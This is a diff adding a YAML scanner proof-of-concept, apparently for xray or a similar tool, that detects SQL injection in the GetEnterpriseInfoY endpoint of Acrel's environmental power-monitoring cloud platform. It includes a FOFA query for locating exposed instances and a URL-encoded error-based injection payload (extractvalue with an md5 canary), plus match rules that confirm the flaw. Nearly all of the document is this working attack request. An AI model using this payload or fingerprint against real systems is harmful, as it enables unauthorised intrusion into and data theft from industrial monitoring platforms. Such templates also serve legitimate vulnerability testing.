@@ -1,0 +1,20 @@
+id: poc-yaml-acreldny-getenterpriseinfoy-sqli
+info:
+  name: 安科瑞环保用电监管云平台 GetEnterpriseInfoY SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 安科瑞环保用电监管云平台
+  fofa: body="myCss/phone.css"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /MainMonitor/GetEnterpriseInfoY
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: EnterpriseId=2107265665700008%27and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2Cmd5%28{{.t1}}%29%29%29and%27&Type=4
+  expression: status_code == 200 && contains(body,"系统异常") && contains(body,substr(t2,0,31))
+    && contains(body,"XPATH syntax error")
+transport: http
